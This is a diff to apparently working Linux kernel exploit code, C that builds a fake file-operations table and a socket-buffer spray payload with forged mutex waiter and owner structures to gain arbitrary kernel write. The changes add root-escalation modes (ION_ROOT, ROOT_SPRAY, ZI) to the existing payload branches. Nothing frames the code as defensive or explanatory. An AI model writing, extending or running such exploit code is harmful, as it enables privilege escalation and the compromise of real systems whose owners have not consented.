@@ -422,8 +422,10 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    */
   int rb_leaf = env_flag("MODE4_FOPS_RB_LEAF", 0) ||
                 env_flag("MODE4_ION_SAFE", 0) ||
+                env_flag("MODE4_ION_ROOT", 0) ||
                 env_flag("MODE4_ROOT_SPRAY", 0) ||
                 env_flag("MODE4_CHAIN", 0) ||
+                env_flag("MODE4_ZI", 0) ||
                 env_flag("MODE4_ZION", 0) ||
                 env_flag("MODE4_ARISTOTLE", 0) ||
                 env_flag("MODE4_WRITE_PROOF", 0) ||
@@ -856,22 +858,24 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         pr_info("mode4 LOCK_EMPTY waiters=0 owner=0 (isolation)\n");
     } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
                (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0) ||
-                env_flag("MODE4_PAD3", 0))) {
+                env_flag("MODE4_PAD3", 0) || env_flag("MODE4_ROOT_SPRAY", 0))) {
       /*
-       * aristotle / PAD3: owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase,
-       * skip fragile fake_task setprio. waiters root = W0 empty leaf.
-       * PAD3 is only-left AAW (same class as bootid write-proof).
+       * owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase, skip fake_task
+       * setprio. bootid write-proof proven with this.
        */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
       put64(p, LOCK_OFF + 0x18, 1);
       if (chunk == 0)
-        pr_info("mode4 ARISTOTLE/PAD3 lock.waiters=W0 owner=1 (clean exit after "
-                "erase; no fake_task boost)\n");
+        pr_info("mode4 owner=1 waiters=W0 (ARISTOTLE/ROOT clean exit)\n");
     } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
-               (env_flag("MODE4_LOCK_OWNER0", 0) || env_flag("MODE4_CHAIN", 0) ||
+               (env_flag("MODE4_LOCK_OWNER0", 0) ||
                 env_flag("MODE4_ZION", 0) ||
-                env_flag("MODE4_ION_SAFE", 0) || env_flag("MODE4_ZERO_NAME", 0) ||
+                env_flag("MODE4_ZI", 0) ||
+                env_flag("MODE4_CHAIN", 0) ||
+                env_flag("MODE4_ION_SAFE", 0) ||
+                env_flag("MODE4_ION_ROOT", 0) ||
+                env_flag("MODE4_ZERO_NAME", 0) ||
                 env_flag("MODE4_ZERO_OWNER", 0) || env_flag("MODE4_FOPS_SLOT", 0))) {
       /*
        * 5.10 adjust after dequeue: if owner==NULL, skip fake_task setprio path.
@@ -960,7 +964,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
              env_flag("MODE4_ZERO_NAME", 0) ||
              env_flag("MODE4_ZERO_OWNER", 0) ||
              env_flag("MODE4_CHAIN", 0) ||
+             env_flag("MODE4_ZI", 0) ||
              env_flag("MODE4_ION_SAFE", 0) ||
+             env_flag("MODE4_ION_ROOT", 0) ||
+             env_flag("MODE4_ROOT_SPRAY", 0) ||
              env_flag("MODE4_LOCK_OWNER0", 0))
       /* Stack prio=200; W0 must stay top after re-enqueue (lower prio number). */
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 100);
